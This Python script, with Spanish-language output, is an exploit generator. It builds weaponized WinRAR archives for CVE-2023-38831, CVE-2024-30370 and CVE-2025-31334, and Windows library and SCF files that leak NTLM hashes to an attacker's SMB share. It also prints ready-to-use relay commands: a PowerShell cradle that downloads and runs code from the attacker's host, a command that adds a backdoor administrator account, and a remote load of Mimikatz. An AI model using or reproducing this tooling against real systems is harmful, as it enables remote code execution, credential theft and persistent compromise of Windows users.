# main.py
import os
import shutil
import string
import random
import tempfile
import subprocess
import argparse
import zipfile
import base64
from typing import Callable

_empty_log = lambda *a, **kw: None

def random_str(length=10):
    return ''.join(random.choices(string.ascii_letters, k=length))

 
def ensure_file_exists(path):
    if not os.path.isfile(path):
        raise FileNotFoundError(f"Archivo no encontrado: {path}")
    return os.path.abspath(path)

def prepare_temp_dir(prefix="tmp_exploit_"):
    temp_dir = tempfile.mkdtemp(prefix=prefix)
    return temp_dir

def cleanup(path):
    if os.path.exists(path):
        shutil.rmtree(path, ignore_errors=True)
        print(f"[*] Limpieza: {path}")

# ---------------- CVE-2023-38831 ----------------
def exploit_38831(bait, switch, output, verbose=_empty_log):
    """
    Creates exploit for CVE-2023-38831 (WinRAR RCE)
    """
    temp_dir = prepare_temp_dir("rarce_")
    bait_name = os.path.basename(bait)
    ext = os.path.splitext(switch)[1].lstrip(".")

    bait_ph = random_str(len(bait_name) + 1)
    path_ph = random_str(len(bait_name) + 1)
    switch_ph = random_str(len(bait_name) + len(ext) + 2)

    nested = os.path.join(temp_dir, path_ph)
    os.mkdir(nested)
    shutil.copyfile(bait, os.path.join(temp_dir, bait_ph))
    shutil.copyfile(switch, os.path.join(nested, switch_ph))

    archive_path = f"{temp_dir}.zip"
    shutil.make_archive(temp_dir, 'zip', temp_dir)

    with open(archive_path, "rb") as f:
        data = f.read()
    data = data.replace(bait_ph.encode(), bait_name.encode() + b" ")
    data = data.replace(switch_ph.encode(), bait_name.encode() + b" ." + ext.encode())
    data = data.replace(path_ph.encode(), bait_name.encode() + b" ")

    with open(output, "wb") as out:
        out.write(data)

    os.remove(archive_path)
    cleanup(temp_dir)
    print(f"[✅] Exploit CVE-2023-38831 creado: {output}")

# ---------------- CVE-2024-30370 + CVE-2025-31334 ----------------
def check_rar_cli():
    try:
        result = subprocess.run(["rar"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        return "WinRAR" in result.stdout.decode(errors="ignore") + result.stderr.decode(errors="ignore")
    except Exception:
        return False

def exploit_dual(payload, output, alt_name="payload [safe].exe", symlink_name="runme_link.exe"):
    """
    Creates exploit for CVE-2024-30370 and CVE-2025-31334 using alternative names and symlinks
    """
    if not check_rar_cli():
        print("[!] WinRAR CLI (rar.exe) no está disponible en PATH.")
        return False

    temp_dir = prepare_temp_dir("dual_")
    payload_path = os.path.abspath(payload)

    alt_path = os.path.join(temp_dir, alt_name)
    shutil.copy(payload_path, alt_path)

    symlink_path = os.path.join(temp_dir, symlink_name)
    try:
        os.symlink(payload_path, symlink_path)
    except Exception as e:
        print(f"[!] No se pudo crear el symlink: {e}")
        print("💡 Ejecuta como Administrador o activa Developer Mode.")
        cleanup(temp_dir)
        return False

    cmd = f'rar a -ep1 "{output}" "{alt_path}" "{symlink_path}"'
    try:
        result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True, timeout=30)
        cleanup(temp_dir)
        print(f"[✅] Exploit dual CVE-2024-30370 & CVE-2025-31334 creado: {output}")
        print("📌 Verifica MotW con PowerShell:\n" +
              f"  Get-Item .\\\"{alt_name}\" -Stream *\n" +
              f"  Get-Item .\\\"{symlink_name}\" -Stream *")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Error ejecutando rar: {e}")
        print(f"STDOUT: {e.stdout}")
        print(f"STDERR: {e.stderr}")
        cleanup(temp_dir)
        return False
    except Exception as e:
        print(f"[!] Error inesperado: {e}")
        cleanup(temp_dir)
        return False

def create_dummy_payload(payload_name="payload.exe"):
    """Create a dummy payload for testing"""
    if not os.path.exists(payload_name):
        with open(payload_name, "wb") as f:
            f.write(b"MZ" + b"\x00" * 100)  
        print(f"[+] Payload simulado generado: {payload_name}")
    return payload_name

# ---------------- CVE-XXXX-XXXX (Library Exploit) ----------------
def create_library_exploit(file_name, ip_address, share_name="shared", output_zip="exploit.zip", library_type="basic"):
    """
    Creates a Windows Library exploit that connects to a remote SMB share
    
    Args:
        file_name (str): Name of the library file (without extension)
        ip_address (str): Target IP address for SMB connection
        share_name (str): SMB share name (default: "shared")
        output_zip (str): Output ZIP filename (default: "exploit.zip")
        library_type (str): Type of library ("basic", "advanced", "scf")
    """
    
    if library_type == "basic":
        library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34580</name>
  <version>1</version>
  <isLibraryPinned>true</isLibraryPinned>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\\\{ip_address}\\{share_name}</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"""
    
    elif library_type == "advanced":
        library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>Corporate Documents</name>
  <version>1</version>
  <isLibraryPinned>true</isLibraryPinned>
  <templateInfo>
    <folderType>{{7d49d726-3c21-4f05-99aa-fdc2c9474656}}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <simpleLocation>
        <url>\\\\{ip_address}\\{share_name}</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"""
    
    elif library_type == "scf":
    
        library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>System Files</name>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip_address}\\{share_name}</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"""
        
        scf_content = f"""[Shell]
Command=2
IconFile=\\\\{ip_address}\\{share_name}\\test.ico
[Taskbar]
Command=ToggleDesktop
"""
        
        library_file_name = f"{file_name}.library-ms"
        scf_file_name = f"{file_name}.scf"
        
        with open(library_file_name, "w", encoding="utf-8") as f:
            f.write(library_content)
        
        with open(scf_file_name, "w", encoding="utf-8") as f:
            f.write(scf_content)

        with zipfile.ZipFile(output_zip, mode="w", compression=zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(library_file_name)
            zipf.write(scf_file_name)

        # Limpiar archivos temporales
        for file in [library_file_name, scf_file_name]:
            if os.path.exists(file):
                os.remove(file)

        print(f"[✅] Library + SCF exploit creado: {output_zip}")
        print(f"   IP objetivo: \\\\{ip_address}\\{share_name}")
        print("   🎯 Usa con Responder para capturar hashes")
        print("   💡 Comando: responder -I eth0")
        return

    library_file_name = f"{file_name}.library-ms"
    with open(library_file_name, "w", encoding="utf-8") as f:
        f.write(library_content)

    with zipfile.ZipFile(output_zip, mode="w", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(library_file_name)

    if os.path.exists(library_file_name):
        os.remove(library_file_name)

    print(f"[✅] Library exploit ({library_type}) creado: {output_zip}")
    print(f"   Nombre del archivo: {library_file_name}")
    print(f"   IP objetivo: \\\\{ip_address}\\{share_name}")
    
    if library_type == "basic":
        print("   🎯 Usa con Responder o ntlmrelayx para capturar hashes")
        print("   💡 Comandos:")
        print("      responder -I eth0")
        print("      ntlmrelayx.py -smb2support -of hashes.txt")
    elif library_type == "advanced":
        print("   🎯 Library avanzada para bypass de algunas protecciones")

def encode_powershell_command(command):
    """Encode PowerShell command to Base64"""
    return base64.b64encode(command.encode('utf-16le')).decode('ascii')

def create_library_exploit_with_commands(file_name, ip_address, commands=None, output_zip="command_exploit.zip"):
    """
    Creates library exploit with pre-configured command examples for ntlmrelayx
    
    Args:
        file_name (str): Name of the library file
        ip_address (str): Attacker IP for relay
        commands (list): List of PowerShell commands to suggest
        output_zip (str): Output ZIP filename
    """
    
    if commands is None:
        commands = [
            "# Reverse shell básica",
            f"powershell -e {encode_powershell_command('IEX (New-Object Net.WebClient).DownloadString(\"http://{ip_address}/payload.ps1\")')}",
            "# Crear usuario administrador",
            "net user hacker Password123! /add && net localgroup administrators hacker /add",
            "# Descargar y ejecutar Mimikatz",
            f"powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://{ip_address}/Invoke-Mimikatz.ps1'); Invoke-Mimikatz\"",
            "# Ejecutar comando personalizado",
            "whoami && ipconfig"
        ]
    
    print("=== Comandos sugeridos para ntlmrelayx ===")
    for i, cmd in enumerate(commands, 1):
        print(f"{i}. {cmd}")
    
    print(f"\n🔧 Ejemplo de uso con ntlmrelayx:")
    print(f"ntlmrelayx.py -smb2support -c \"{commands[1].split('#')[0].strip()}\" -of hashes.txt")
    print(f"\n📡 Inicia el listener:")
    print(f"responder -I eth0")
    
 
    create_library_exploit(file_name, ip_address, "shared", output_zip, "advanced")
 
def main():
    parser = argparse.ArgumentParser(
        description="Generador combinado de exploits para múltiples CVEs de WinRAR y Windows Library.",
        epilog="Ejemplos de uso:"
    )
    
    subparsers = parser.add_subparsers(dest='exploit_type', help='Tipo de exploit a generar')
    
    # CVE-2023-38831 parser
    parser_38831 = subparsers.add_parser('cve-2023-38831', help='CVE-2023-38831 (WinRAR RCE)')
    parser_38831.add_argument("--bait", required=True, help="Archivo señuelo (e.g. document.pdf)")
    parser_38831.add_argument("--switch", required=True, help="Script malicioso (e.g. reverse_shell.cmd)")
    parser_38831.add_argument("--output", default="exploit_38831.rar", help="Archivo de salida (por defecto: exploit_38831.rar)")
    
    # CVE-2024-30370 + CVE-2025-31334 parser
    parser_dual = subparsers.add_parser('cve-dual', help='CVE-2024-30370 & CVE-2025-31334 (Dual exploit)')
    parser_dual.add_argument("--payload", default="payload.exe", help="Nombre de payload (por defecto: payload.exe)")
    parser_dual.add_argument("--output", default="exploit_dual.rar", help="Archivo de salida (por defecto: exploit_dual.rar)")
    parser_dual.add_argument("--alt-name", default="payload [safe].exe", help="Nombre alternativo para el payload")
    parser_dual.add_argument("--symlink-name", default="runme_link.exe", help="Nombre del symlink")
    
    # Library exploit parser
    parser_library = subparsers.add_parser('library', help='Windows Library Exploit')
    parser_library.add_argument("--file-name", required=True, help="Nombre del archivo library (sin extensión)")
    parser_library.add_argument("--ip", required=True, help="Dirección IP del servidor SMB (e.g. 192.168.1.162)")
    parser_library.add_argument("--share", default="shared", help="Nombre del share SMB (por defecto: shared)")
    parser_library.add_argument("--output", default="exploit.zip", help="Archivo ZIP de salida (por defecto: exploit.zip)")
    parser_library.add_argument("--type", choices=["basic", "advanced", "scf"], default="basic", help="Tipo de library exploit")
    parser_library.add_argument("--commands", action="store_true", help="Mostrar comandos sugeridos para ejecución remota")
    
    # Interactive mode
    parser_interactive = subparsers.add_parser('interactive', help='Modo interactivo para Library Exploit')
    
    args = parser.parse_args()

    try:
        if args.exploit_type == 'cve-2023-38831':
            bait = ensure_file_exists(args.bait)
            switch = ensure_file_exists(args.switch)
            exploit_38831(bait, switch, args.output)
            
        elif args.exploit_type == 'cve-dual':
            payload = args.payload
            if not os.path.exists(payload):
                payload = create_dummy_payload(payload)
            else:
                payload = ensure_file_exists(payload)
            exploit_dual(payload, args.output, args.alt_name, args.symlink_name)
            
        elif args.exploit_type == 'library':
            if args.commands:
                create_library_exploit_with_commands(args.file_name, args.ip, output_zip=args.output)
            else:
                create_library_exploit(args.file_name, args.ip, args.share, args.output, args.type)
            
        elif args.exploit_type == 'interactive':
            print("=== Modo Interactivo - Library Exploit ===")
            file_name = input("Enter your file name: ")
            ip_address = input("Enter IP (EX: 192.168.1.162): ")
            
            print("\nTipos de exploit disponibles:")
            print("1. Básico (para captura de hashes)")
            print("2. Avanzado (con bypass de protecciones)")
            print("3. SCF + Library (combinado)")
            print("4. Comandos sugeridos")
            
            choice = input("Selecciona tipo (1-4): ").strip()
            
            if choice == "1":
                create_library_exploit(file_name, ip_address, "shared", "exploit.zip", "basic")
            elif choice == "2":
                create_library_exploit(file_name, ip_address, "shared", "exploit.zip", "advanced")
            elif choice == "3":
                create_library_exploit(file_name, ip_address, "shared", "exploit.zip", "scf")
            elif choice == "4":
                create_library_exploit_with_commands(file_name, ip_address)
            else:
                create_library_exploit(file_name, ip_address)
            
        else:
            parser.print_help()
            
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
